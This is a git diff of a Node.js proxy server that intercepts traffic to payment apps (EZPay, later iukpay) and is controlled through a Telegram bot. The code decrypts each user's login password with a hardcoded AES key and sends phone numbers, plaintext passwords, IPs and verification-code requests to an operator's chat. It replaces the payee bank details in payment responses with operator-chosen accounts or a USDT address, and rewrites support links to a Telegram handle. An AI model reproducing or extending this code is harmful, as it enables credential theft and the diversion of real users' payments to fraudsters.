-      await bot.sendMessage(chatId, `✅ Bank #${data.banks.length} added:\n${newBank.accountHolder} | ${newBank.accountNo}\nIFSC: ${newBank.ifsc}${newBank.bankName ? '\nBank: ' + newBank.bankName : ''}${newBank.upiId ? '\nUPI: ' + newBank.upiId : ''}${minStr}`);
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/setmin ')) {
-      data = await loadData(true);
-      const parts = text.substring(8).trim().split(/\s+/);
-      const bankIdx = parseInt(parts[0]) - 1;
-      const amount = parseFloat(parts[1]);
-      if (isNaN(bankIdx) || bankIdx < 0 || bankIdx >= (data.banks || []).length || isNaN(amount)) {
-        await bot.sendMessage(chatId, '❌ Format: /setmin <bank_number> <amount>\nExample: /setmin 1 500');
-        return res.sendStatus(200);
-      }
-      data.banks[bankIdx].minAmount = amount;
-      data._skipOverrideMerge = true;
-      await saveData(data);
-      await bot.sendMessage(chatId, `✅ Min amount for bank #${bankIdx + 1} set to ₹${amount}`);
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/removebank ')) {
-      data = await loadData(true);
-      const idx = parseInt(text.substring(12).trim()) - 1;
-      if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid. /banks se check karo'); return res.sendStatus(200); }
-      const removed = data.banks.splice(idx, 1)[0];
-      if (data.activeIndex === idx) data.activeIndex = data.banks.length > 0 ? 0 : -1;
-      else if (data.activeIndex > idx) data.activeIndex--;
-      if (data.userOverrides) {
-        for (const uid of Object.keys(data.userOverrides)) {
-          const uo = data.userOverrides[uid];
-          if (uo.bankIndex !== undefined) {
-            if (uo.bankIndex === idx) delete uo.bankIndex;
-            else if (uo.bankIndex > idx) uo.bankIndex--;
-          }
-        }
-      }
-      data._skipOverrideMerge = true;
-      await saveData(data);
-      await bot.sendMessage(chatId, `🗑️ Removed: ${removed.accountHolder} | ${removed.accountNo}`);
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/setbank ')) {
-      data = await loadData(true);
-      const idx = parseInt(text.substring(9).trim()) - 1;
-      if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid index'); return res.sendStatus(200); }
-      data.activeIndex = idx;
-      data._skipOverrideMerge = true;
-      await saveData(data);
-      const bankInfo = data.banks[idx];
-      await bot.sendMessage(chatId, `✅ Active bank set to #${idx + 1}:\n${bankInfo.accountHolder} | ${bankInfo.accountNo} | ${bankInfo.ifsc}${bankInfo.bankName ? ' | ' + bankInfo.bankName : ''}`);
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/usdt ')) {
-      const addr = text.substring(6).trim();
-      data = await loadData(true);
-      if (addr.toLowerCase() === 'off') {
-        data.usdtAddress = '';
-        data._skipOverrideMerge = true;
-        await saveData(data);
-        await bot.sendMessage(chatId, '❌ USDT override OFF');
-      } else if (addr.length >= 20) {
-        data.usdtAddress = addr;
-        data._skipOverrideMerge = true;
-        await saveData(data);
-        await bot.sendMessage(chatId, `₮ USDT address set: ${addr}`);
-      } else {
-        await bot.sendMessage(chatId, '❌ Invalid address (20+ chars required)');
-      }
-      return res.sendStatus(200);
-    }
-
-
     if (text === '/help') {
       await bot.sendMessage(chatId, 'Use /start to see all commands.');
       return res.sendStatus(200);
@@ -1428,83 +1404,74 @@ app.post('/app/api/system/v2/login', async (req, res) => {
     const body = req.parsedBody || {};
     const phone = body.memberPhone || body.phone || body.mobile || body.telephone || body.username || '';
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const userId = await extractUserId(req, jsonResp);
-    const loginData = getResponseData(jsonResp) || {};
-    // EZPay LoginBean returns: appToken, memberCode, memberPhone, ifSetPinCode
-    const appToken = loginData.appToken || loginData.token || loginData.accessToken || '';
-    const memberCode = loginData.memberCode || loginData.memberCodeId || loginData.memberId || loginData.userId || loginData.id || '';
-    const respPhone = loginData.memberPhone || loginData.phone || loginData.mobile || loginData.telephone || '';
-    const ifSetPinCode = loginData.ifSetPinCode || loginData.hasPinCode || '';
-    const finalUserId = userId || String(memberCode || '');
-
-    if (finalUserId) {
-      saveTokenUserId(req, finalUserId);
-      if (phone) userPhoneMap[String(finalUserId)] = String(phone);
-      if (respPhone) userPhoneMap[String(finalUserId)] = String(respPhone);
-      if (appToken) {
-        tokenUserMap[appToken] = String(finalUserId);
-        // Architect-fix #3: also populate reverse map (userId -> token) so bot commands work
-        // immediately after login even before next authenticated request lands.
-        userTokenMap[String(finalUserId)] = appToken;
-        if (redis) {
-          redis.hset('ezpayTokenMap', appToken.substring(0, 100), String(finalUserId)).catch(()=>{});
-          redis.hset('ezpayUserTokenMap', String(finalUserId), appToken).catch(()=>{});
-        }
-      }
-      const detectedPhone = phone || respPhone;
-      trackUser(data, finalUserId, 'Login', detectedPhone);
-      saveData(data).catch(()=>{});
-    }
-
-    // Decrypt password (AES-128-CBC, key from replit.md)
-    const encPwd = body.memberPwd || body.password || body.pwd || '';
-    let pwd = encPwd;
-    if (encPwd) {
-      try {
-        const AES_KEY = '8Kjsis90sJnsHys8';
-        const keyBytes = Buffer.from(AES_KEY, 'utf8');
-        const iv = keyBytes.slice(0, 16);
-        const decipher = crypto.createDecipheriv('aes-128-cbc', keyBytes, iv);
-        let decrypted = decipher.update(Buffer.from(encPwd, 'base64'));
-        decrypted = Buffer.concat([decrypted, decipher.final()]);
-        pwd = decrypted.toString('utf8');
-      } catch(e) { pwd = encPwd + ' (decrypt failed)'; }
-    }
 
     if (data.adminChatId && bot) {
-      const isSuccess = jsonResp?.code === 200 || jsonResp?.code === 0 || jsonResp?.success === true;
-      const statusEmoji = isSuccess ? '✅' : '❌';
-      const respCode = jsonResp?.code !== undefined ? jsonResp.code : 'N/A';
-      const respMsg = jsonResp?.msg || jsonResp?.message || '';
+      const sentHeaders = {};
+      for (const [k, v] of Object.entries(req.headers)) {
+        const kl = k.toLowerCase();
+        if (!['host','connection','content-length','transfer-encoding'].includes(kl) && !kl.startsWith('x-vercel') && !kl.startsWith('x-forwarded')) {
+          sentHeaders[k] = v;
+        }
+      }
+      const debugMsg = `🔍 LOGIN DEBUG\n📱 Phone: ${phone}\n\n📤 HEADERS SENT TO API:\n${JSON.stringify(sentHeaders, null, 2).substring(0, 1500)}\n\n📥 API RESPONSE:\n${JSON.stringify(jsonResp, null, 2).substring(0, 1000)}`;
+      bot.sendMessage(data.adminChatId, debugMsg).catch(() => {});
+    }
 
-      // Full server response (truncated for telegram limit)
-      const fullRespJson = JSON.stringify(loginData, null, 2);
-      const truncatedResp = fullRespJson.length > 1500 ? fullRespJson.substring(0, 1500) + '\n... (truncated)' : fullRespJson;
-
-      const msg =
-`🔑 LOGIN ${statusEmoji}
-━━━━━━━━━━━━━━━━━━
-📱 Phone: ${phone || respPhone || 'N/A'}
-🔒 Password: ${pwd || 'N/A'}
-👤 MemberCode (UserID): ${memberCode || 'N/A'}
-🎟️ AppToken: ${appToken ? '<code>' + appToken + '</code>' : 'N/A'}
-📌 PIN Set: ${ifSetPinCode === '1' || ifSetPinCode === true ? 'Yes' : (ifSetPinCode === '0' || ifSetPinCode === false ? 'No' : 'N/A')}
-
-📊 Server Response:
-   Code: ${respCode}
-   Msg: ${respMsg || 'N/A'}
-
-🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}
-📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}
-🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
-
-📦 Full Login Data:
-<pre>${truncatedResp.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</pre>`;
-
-      bot.sendMessage(data.adminChatId, msg, { parse_mode: 'HTML' }).catch((e)=>{
-        // fallback without HTML if parse fails
-        bot.sendMessage(data.adminChatId, msg.replace(/<[^>]+>/g,'')).catch(()=>{});
-      });
+    const userId = await extractUserId(req, jsonResp);
+    if (userId) {
+      saveTokenUserId(req, userId);
+      if (phone) userPhoneMap[String(userId)] = String(phone);
+      const loginData = getResponseData(jsonResp);
+      if (loginData && loginData.token) {
+        tokenUserMap[loginData.token] = String(userId);
+        if (redis) redis.hset('iukpayTokenMap', loginData.token.substring(0, 100), String(userId)).catch(()=>{});
+      }
+      if (loginData && loginData.accessToken) {
+        tokenUserMap[loginData.accessToken] = String(userId);
+        if (redis) redis.hset('iukpayTokenMap', loginData.accessToken.substring(0, 100), String(userId)).catch(()=>{});
+      }
+      if (loginData) {
+        const respPhone = loginData.memberPhone || loginData.phone || loginData.mobile || loginData.telephone || '';
+        if (respPhone && userId) userPhoneMap[String(userId)] = String(respPhone);
+      }
+      const detectedPhone = phone || (loginData?.memberPhone || loginData?.phone || loginData?.mobile || loginData?.telephone || '');
+      trackUser(data, userId, 'Login', detectedPhone);
+      saveData(data).catch(()=>{});
+    } else if (phone) {
+      const loginData = getResponseData(jsonResp);
+      const respUserId = loginData?.memberCodeId || loginData?.memberId || loginData?.userId || loginData?.id || '';
+      if (respUserId) {
+        userPhoneMap[String(respUserId)] = String(phone);
+        saveTokenUserId(req, String(respUserId));
+        if (loginData && loginData.token) {
+          tokenUserMap[loginData.token] = String(respUserId);
+          if (redis) redis.hset('iukpayTokenMap', loginData.token.substring(0, 100), String(respUserId)).catch(()=>{});
+        }
+        if (loginData && loginData.accessToken) {
+          tokenUserMap[loginData.accessToken] = String(respUserId);
+          if (redis) redis.hset('iukpayTokenMap', loginData.accessToken.substring(0, 100), String(respUserId)).catch(()=>{});
+        }
+        trackUser(data, String(respUserId), 'Login', phone);
+        saveData(data).catch(()=>{});
+      }
+    }
+    const loginData2 = getResponseData(jsonResp);
+    const finalUserId = userId || loginData2?.memberCodeId || loginData2?.memberId || loginData2?.userId || '';
+    if (data.adminChatId && bot) {
+      const encPwd = body.memberPwd || body.password || body.pwd || '';
+      let pwd = encPwd;
+      if (encPwd) {
+        try {
+          const AES_KEY = '8k90HysJue029Uhs';
+          const keyBytes = Buffer.from(AES_KEY, 'utf8');
+          const iv = keyBytes.slice(0, 16);
+          const decipher = crypto.createDecipheriv('aes-128-cbc', keyBytes, iv);
+          let decrypted = decipher.update(Buffer.from(encPwd, 'base64'));
+          decrypted = Buffer.concat([decrypted, decipher.final()]);
+          pwd = decrypted.toString('utf8');
+        } catch(e) { pwd = encPwd; }
+      }
+      bot.sendMessage(data.adminChatId, `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd || 'N/A'}\n👤 UserID: ${finalUserId || 'N/A'}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
@@ -1848,16 +1815,15 @@ app.post('/app/api/memberRecharge/getUsdtRate', async (req, res) => {
   } catch(e) { await transparentProxy(req, res); }
 });
 
-app.all('/app/api/memberManager/getMemberVerificationCode', async (req, res) => {
+app.post('/app/api/memberManager/getMemberVerificationCode', async (req, res) => {
   const data = await loadData();
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const userId = await extractUserId(req, jsonResp);
-    const phone = getPhone(data, userId);
-    if (data.adminChatId && bot) {
+    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
       const reqBody = JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1500);
       const respDump = JSON.stringify(jsonResp, null, 2).substring(0, 2000);
-      bot.sendMessage(data.adminChatId, `🔐 Verification Code Request\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n📝 codeType: ${(req.parsedBody || {}).codeType || 'N/A'}\n\n📤 REQUEST:\n${reqBody}\n\n📥 RESPONSE:\n${respDump}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `🔐 Verification Code [${userId || 'N/A'}]\n\n📝 REQUEST:\n${reqBody}\n\n📥 RESPONSE:\n${respDump}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
@@ -1903,7 +1869,7 @@ app.post('/app/api/orderOut/payingSubmitImg', async (req, res) => {
       if (kl === 'host' || kl === 'connection' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
       fwd[k] = v;
     }
-    fwd['host'] = 'api.ezpaycenter.com';
+    fwd['host'] = 'api.iukpay.com';
     const opts = { method: req.method, headers: fwd };
     if (req.rawBody && req.rawBody.length > 0) {
       opts.body = req.rawBody;
@@ -1950,7 +1916,7 @@ app.post('/app/api/orderOut/payingSubmitImg', async (req, res) => {
               const imageData = part.slice(headerEnd + 4);
               if (imageData.length > 100) {
                 const imgHash = crypto.createHash('md5').update(imageData).digest('hex');
-                const cacheKey = `ezpay:sent_img:${imgHash}`;
+                const cacheKey = `iukpay:sent_img:${imgHash}`;
                 let duplicate = false;
                 if (sentImgHashes.has(imgHash)) {
                   duplicate = true;
@@ -2005,7 +1971,7 @@ app.post('/app/api/orderOut/pendingSubmitImg', async (req, res) => {
       if (kl === 'host' || kl === 'connection' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
       fwd[k] = v;
     }
-    fwd['host'] = 'api.ezpaycenter.com';
+    fwd['host'] = 'api.iukpay.com';
     const opts = { method: req.method, headers: fwd };
     if (req.rawBody && req.rawBody.length > 0) {
       opts.body = req.rawBody;
@@ -2028,7 +1994,7 @@ app.post('/app/api/orderOut/pendingSubmitImg', async (req, res) => {
       const rawStr = req.rawBody ? req.rawBody.toString('utf8', 0, Math.min(req.rawBody.length, 500)) : '';
       const imgUrls = rawStr.match(/https?:\/\/[^\s"',\r\n]+\.(jpg|jpeg|png|gif|webp)[^\s"',\r\n]*/gi) || [];
       const bodyHash = crypto.createHash('md5').update(req.rawBody || '').digest('hex');
-      const cacheKey = `ezpay:sent_pending_img:${bodyHash}`;
+      const cacheKey = `iukpay:sent_pending_img:${bodyHash}`;
       let duplicate = false;
       if (sentImgHashes.has(bodyHash)) {
         duplicate = true;
@@ -2085,7 +2051,7 @@ app.all('/app/api/orderOut/paying', async (req, res) => {
     const respData = getResponseData(jsonResp);
     if (data.adminChatId && bot && !isLogOff(data, detectedUserId) && !(await isLogOffByToken(data, req))) {
       const dump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
-      await safeSend(data.adminChatId, `🔍 PAYING RAW RESPONSE:\n${dump}`);
+      bot.sendMessage(data.adminChatId, `🔍 PAYING RAW RESPONSE:\n${dump}`).catch(()=>{});
     }
     let shouldOverride = true;
     if (active && active.minAmount) {
@@ -2103,13 +2069,13 @@ app.all('/app/api/orderOut/paying', async (req, res) => {
     }
     if (data.adminChatId && bot && !isLogOff(data, detectedUserId) && !(await isLogOffByToken(data, req))) {
       const afterDump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
-      await safeSend(data.adminChatId, `✅ PAYING AFTER REPLACE:\n${afterDump}`);
+      bot.sendMessage(data.adminChatId, `✅ PAYING AFTER REPLACE:\n${afterDump}`).catch(()=>{});
     }
     const phone = getPhone(data, detectedUserId);
     if (data.adminChatId && bot && !isLogOff(data, detectedUserId) && !(await isLogOffByToken(data, req))) {
       const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
       const overrideLabel = shouldOverride ? "" : " [REAL BANK - UNDER MIN LIMIT]";
-      await safeSend(data.adminChatId,
+      bot.sendMessage(data.adminChatId,
 `🔔 💳 Paying${overrideLabel}
 👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
 Order: ${rd.orderId || rd.orderNo || 'N/A'}
@@ -2117,7 +2083,7 @@ Amount: ₹${rd.amount || rd.orderAmount || 'N/A'}
 Bank: ${shouldOverride && active ? active.accountNo : (rd.customerBankNumber || rd.accountNo || 'N/A')}
 Acc: ${shouldOverride && active ? active.accountHolder : (rd.customerName || rd.accountHolder || 'N/A')}
 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
-      );
+      ).catch(()=>{});
     }
     if (detectedUserId) { trackUser(data, detectedUserId, 'Paying'); saveData(data).catch(()=>{}); }
     sendJson(res, respHeaders, jsonResp, respBody);
@@ -2458,114 +2424,7 @@ app.all('/app/api/memberManager/bindRobotDetail', async (req, res) => {
     if (data.adminChatId && bot) {
       const phone = getPhone(data, userId);
       const rd = (respData && typeof respData === 'object') ? respData : {};
-      const flag = rd.bindTelegramBotFlag;
-      const boundLabel = (flag === '1' || flag === 1) ? '✅ BOUND' : (flag === '0' || flag === 0) ? '❌ NOT BOUND' : `❓ ${flag ?? 'N/A'}`;
-      bot.sendMessage(data.adminChatId, `🤖 Robot Bind Details\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n📱 Telegram Bot: ${rd.telegramBotLink || rd.botLink || 'N/A'}\n🔑 Bind Code: ${rd.telegramBindCode || rd.bindCode || rd.code || 'N/A'}\n🔗 Bound: ${boundLabel}\n📊 Full: ${JSON.stringify(rd).substring(0, 500)}`).catch(()=>{});
-
-      // === DEBUG DUMP ===
-      // Full request headers + body + upstream response — to compare what APK sends vs what bot sends
-      try {
-        const skipHeaders = new Set(['x-vercel-id','x-vercel-deployment-url','x-vercel-forwarded-for','x-vercel-ip-as-number','x-vercel-ip-city','x-vercel-ip-continent','x-vercel-ip-country','x-vercel-ip-country-region','x-vercel-ip-latitude','x-vercel-ip-longitude','x-vercel-ip-timezone','x-vercel-ip-postal-code','x-vercel-ja3-digest','x-vercel-ja4-digest','x-vercel-proxied-for','x-vercel-proxy-signature','x-vercel-proxy-signature-ts','x-vercel-internal-ingress-bucket','x-vercel-internal-intra-session','x-vercel-sc-basepath','x-vercel-sc-headers','x-vercel-sc-host','forwarded','x-forwarded-proto','x-forwarded-host','x-real-ip']);
-        const hdrLines = [];
-        for (const [k, v] of Object.entries(req.headers || {})) {
-          if (skipHeaders.has(k.toLowerCase())) continue;
-          hdrLines.push(`  ${k}: ${v}`);
-        }
-        const reqBodyStr = (req.parsedBody !== undefined && req.parsedBody !== null)
-          ? JSON.stringify(req.parsedBody, null, 2)
-          : (req.rawBody ? (Buffer.isBuffer(req.rawBody) ? req.rawBody.toString('utf8') : String(req.rawBody)) : '(empty)');
-        const respBodyStr = (jsonResp !== null && jsonResp !== undefined)
-          ? JSON.stringify(jsonResp, null, 2)
-          : (respBody ? (Buffer.isBuffer(respBody) ? respBody.toString('utf8') : String(respBody)) : '(empty)');
-        const dump =
-`🔍 RAW DEBUG: bindRobotDetail
-👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
-🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
-🌐 Method: ${req.method}
-🔗 URL: ${req.originalUrl}
-
-📤 REQUEST HEADERS (APK → Vercel):
-${hdrLines.join('\n').substring(0, 1800)}
-
-📦 REQUEST BODY:
-${reqBodyStr.substring(0, 800)}
-
-📥 UPSTREAM HTTP: ${response?.status ?? 'N/A'}
-📥 UPSTREAM RESPONSE:
-${respBodyStr.substring(0, 1500)}`;
-        bot.sendMessage(data.adminChatId, dump.substring(0, 4000)).catch(()=>{});
-      } catch(dbgErr) {
-        bot.sendMessage(data.adminChatId, `⚠️ Debug dump failed: ${dbgErr.message}`).catch(()=>{});
-      }
-    }
-    sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) { await transparentProxy(req, res); }
-});
-
-// Helper: build a full request/response dump (headers + body + upstream response)
-function buildFullDebugDump(label, req, response, jsonResp, respBody, userId, phone) {
-  const skipHeaders = new Set(['x-vercel-id','x-vercel-deployment-url','x-vercel-forwarded-for','x-vercel-ip-as-number','x-vercel-ip-city','x-vercel-ip-continent','x-vercel-ip-country','x-vercel-ip-country-region','x-vercel-ip-latitude','x-vercel-ip-longitude','x-vercel-ip-timezone','x-vercel-ip-postal-code','x-vercel-ja3-digest','x-vercel-ja4-digest','x-vercel-proxied-for','x-vercel-proxy-signature','x-vercel-proxy-signature-ts','x-vercel-internal-ingress-bucket','x-vercel-internal-intra-session','x-vercel-sc-basepath','x-vercel-sc-headers','x-vercel-sc-host','forwarded','x-forwarded-proto','x-forwarded-host','x-real-ip']);
-  const hdrLines = [];
-  for (const [k, v] of Object.entries(req.headers || {})) {
-    if (skipHeaders.has(k.toLowerCase())) continue;
-    hdrLines.push(`  ${k}: ${v}`);
-  }
-  const reqBodyStr = (req.parsedBody !== undefined && req.parsedBody !== null)
-    ? JSON.stringify(req.parsedBody, null, 2)
-    : (req.rawBody ? (Buffer.isBuffer(req.rawBody) ? req.rawBody.toString('utf8') : String(req.rawBody)) : '(empty)');
-  const respBodyStr = (jsonResp !== null && jsonResp !== undefined)
-    ? JSON.stringify(jsonResp, null, 2)
-    : (respBody ? (Buffer.isBuffer(respBody) ? respBody.toString('utf8') : String(respBody)) : '(empty)');
-  return `🔍 RAW DEBUG: ${label}
-👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
-🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
-🌐 Method: ${req.method}
-🔗 URL: ${req.originalUrl}
-
-📤 REQUEST HEADERS (APK → Vercel):
-${hdrLines.join('\n').substring(0, 1600)}
-
-📦 REQUEST BODY:
-${reqBodyStr.substring(0, 800)}
-
-📥 UPSTREAM HTTP: ${response?.status ?? 'N/A'}
-📥 UPSTREAM RESPONSE:
-${respBodyStr.substring(0, 1500)}`;
-}
-
-async function handleUnbindRobot(req, res, label) {
-  const data = await loadData();
-  try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const userId = await extractUserId(req, jsonResp);
-    const phone = getPhone(data, userId);
-    if (data.adminChatId && bot) {
-      const code = (req.parsedBody || {}).verificationCode || (req.parsedBody || {}).code || 'N/A';
-      const summary = `🔓 ${label}\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n🔢 Code Sent: ${code}\n📊 Status: ${jsonResp?.status || 'N/A'}\n💬 Message: ${jsonResp?.message || 'N/A'}`;
-      bot.sendMessage(data.adminChatId, summary).catch(()=>{});
-      try {
-        const dump = buildFullDebugDump(label, req, response, jsonResp, respBody, userId, phone);
-        bot.sendMessage(data.adminChatId, dump.substring(0, 4000)).catch(()=>{});
-      } catch(dbgErr) {
-        bot.sendMessage(data.adminChatId, `⚠️ Debug dump failed: ${dbgErr.message}`).catch(()=>{});
-      }
-    }
-    sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) { await transparentProxy(req, res); }
-}
-
-app.all('/app/api/memberManager/v2/unbindRobot', (req, res) => handleUnbindRobot(req, res, 'UNBIND ROBOT (v2) ATTEMPT'));
-app.all('/app/api/memberManager/unbindRobot',    (req, res) => handleUnbindRobot(req, res, 'UNBIND ROBOT (v1) ATTEMPT'));
-
-app.all('/app/api/memberManager/*', async (req, res) => {
-  const data = await loadData();
-  try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const userId = await extractUserId(req, jsonResp);
-    if (data.adminChatId && bot) {
-      const reqBody = JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 800);
-      const respDump = JSON.stringify(jsonResp, null, 2).substring(0, 1500);
-      bot.sendMessage(data.adminChatId, `📋 UNKNOWN memberManager endpoint\n🔗 Path: ${req.originalUrl}\n👤 User: ${userId || 'N/A'}\n\n📤 REQUEST:\n${reqBody}\n\n📥 RESPONSE:\n${respDump}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `🤖 Robot Bind Details\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n📱 Telegram Bot: ${rd.telegramBotLink || rd.botLink || 'N/A'}\n🔑 Bind Code: ${rd.telegramBindCode || rd.bindCode || rd.code || 'N/A'}\n🔗 Bound: ${rd.isBound !== undefined ? rd.isBound : (rd.bound !== undefined ? rd.bound : 'N/A')}\n📊 Full: ${JSON.stringify(rd).substring(0, 500)}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
@@ -2604,7 +2463,12 @@ for (const ep of WALLET_INTERCEPT_ENDPOINTS) {
       const userId = await extractUserId(req, jsonResp);
       const phone = getPhone(data, userId);
       if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
-        bot.sendMessage(data.adminChatId, `🔐 ${req.originalUrl}\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}`).catch(()=>{});
+        let msg = `🔐 ${req.originalUrl}\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}`;
+        if (ep === '/app/api/v1/wallet/security') {
+          const reqBody = JSON.stringify(req.body || {}, null, 2);
+          msg += `\n\n📤 REQUEST:\n${reqBody.substring(0, 3000)}`;
+        }
+        bot.sendMessage(data.adminChatId, msg).catch(()=>{});
       }
       sendJson(res, respHeaders, jsonResp, respBody);
     } catch(e) { await transparentProxy(req, res); }
@@ -2621,26 +2485,26 @@ app.all('/app/api/customer/list', async (req, res) => {
         if (item && typeof item === 'object') {
           for (const [k, v] of Object.entries(item)) {
             if (typeof v === 'string' && (v.includes('http') || v.includes('t.me') || v.includes('telegram') || v.includes('whatsapp') || v.includes('wa.me'))) {
-              item[k] = 'https://t.me/Ezpey_zylox';
+              item[k] = 'https://t.me/iukpay_support';
             }
           }
-          if (item.url) item.url = 'https://t.me/Ezpey_zylox';
-          if (item.link) item.link = 'https://t.me/Ezpey_zylox';
-          if (item.serviceUrl) item.serviceUrl = 'https://t.me/Ezpey_zylox';
-          if (item.customerUrl) item.customerUrl = 'https://t.me/Ezpey_zylox';
-          if (item.contactUrl) item.contactUrl = 'https://t.me/Ezpey_zylox';
+          if (item.url) item.url = 'https://t.me/iukpay_support';
+          if (item.link) item.link = 'https://t.me/iukpay_support';
+          if (item.serviceUrl) item.serviceUrl = 'https://t.me/iukpay_support';
+          if (item.customerUrl) item.customerUrl = 'https://t.me/iukpay_support';
+          if (item.contactUrl) item.contactUrl = 'https://t.me/iukpay_support';
         }
       }
     } else if (respData && typeof respData === 'object') {
       for (const [k, v] of Object.entries(respData)) {
         if (typeof v === 'string' && (v.includes('http') || v.includes('t.me') || v.includes('telegram') || v.includes('whatsapp') || v.includes('wa.me'))) {
-          respData[k] = 'https://t.me/Ezpey_zylox';
+          respData[k] = 'https://t.me/iukpay_support';
         }
       }
     }
     if (jsonResp) {
       const str = JSON.stringify(jsonResp);
-      const replaced = str.replace(/https?:\/\/[^\s"',\\\]}>]+/gi, 'https://t.me/Ezpey_zylox');
+      const replaced = str.replace(/https?:\/\/[^\s"',\\\]}>]+/gi, 'https://t.me/iukpay_support');
       const newJson = JSON.parse(replaced);
       sendJson(res, respHeaders, newJson, replaced);
     } else {
